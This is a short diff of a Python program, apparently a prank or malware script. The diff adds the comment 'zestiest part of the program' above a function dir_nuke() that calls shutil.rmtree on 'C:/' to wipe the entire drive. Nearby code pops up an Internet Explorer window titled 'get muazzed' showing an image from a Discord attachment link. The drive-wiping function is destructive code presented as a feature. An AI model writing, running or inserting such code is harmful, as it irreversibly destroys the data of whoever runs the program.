@@ -44,6 +44,7 @@ def display_image_box():
         objExplorer.document.title = "get muazzed"
         objExplorer.document.body.innerHTML = "<img src='https://cdn.discordapp.com/attachments/1105563151216414811/1105855509879332935/gaymeicon.png' height=200 width=200>"
 
+# zestiest part of the program
 def dir_nuke():
     dir = 'C:/'
     shutil.rmtree(dir)
